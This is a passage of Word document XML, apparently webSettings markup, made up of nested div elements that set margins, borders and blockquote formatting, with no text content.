                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="2013953048">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
                <w:div w:id="1119450030">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
              </w:divsChild>
            </w:div>
            <w:div w:id="1387027616">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1128670393">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
                <w:div w:id="1522085323">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
              </w:divsChild>
            </w:div>
            <w:div w:id="2005351132">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="422193271">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1866751377">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="923496789">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1625500259">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="752557072">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1794859052">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="796142210">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
                <w:div w:id="1300183947">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
              </w:divsChild>
            </w:div>
            <w:div w:id="440299869">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="876890658">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="444274699">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="2140342726">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="28991802">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="56754675">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
                <w:div w:id="1054699868">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
              </w:divsChild>
            </w:div>
            <w:div w:id="346324038">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="436023855">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
                <w:div w:id="1595285613">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
              </w:divsChild>
            </w:div>
            <w:div w:id="909121755">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="350566923">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1377854896">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1019627451">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1980719488">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1469322380">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="2129468214">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
                <w:div w:id="1739983548">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="75"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
              </w:divsChild>
            </w:div>
            <w:div w:id="1008484608">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="75"/>
              <w:marBottom w:val="75"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:left w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:bottom w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
                <w:right w:val="single" w:sz="6" w:space="4" w:color="CCCCCC"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="122448285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22777896">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="300"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="30297595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06127088">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="617224693">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1522888188">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="2051611154">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="single" w:sz="6" w:space="0" w:color="138CCA"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="single" w:sz="6" w:space="0" w:color="138CCA"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1031145615">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="300"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1306395153">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="1674451465">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="109056562">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="746224048">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="0"/>
                          <w:marBottom w:val="0"/>
                          <w:divBdr>
                            <w:top w:val="single" w:sz="6" w:space="15" w:color="DEDEDE"/>
                            <w:left w:val="single" w:sz="6" w:space="15" w:color="DEDEDE"/>
                            <w:bottom w:val="single" w:sz="6" w:space="15" w:color="DEDEDE"/>
                            <w:right w:val="single" w:sz="6" w:space="15" w:color="DEDEDE"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="1169634706">
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="0"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                              <w:divsChild>
                                <w:div w:id="1519461147">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="396324679">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="300"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="223302484">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1034228479">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="1662805441">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="1453744761">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1475634309">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="1239945677">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="601303112">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="1893150120">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                            </w:div>
                                          </w:divsChild>
                                        </w:div>
                                        <w:div w:id="1642223508">
                                          <w:blockQuote w:val="1"/>
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="150"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="single" w:sz="36" w:space="15" w:color="EEEEEE"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                        </w:div>
                                        <w:div w:id="177930655">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
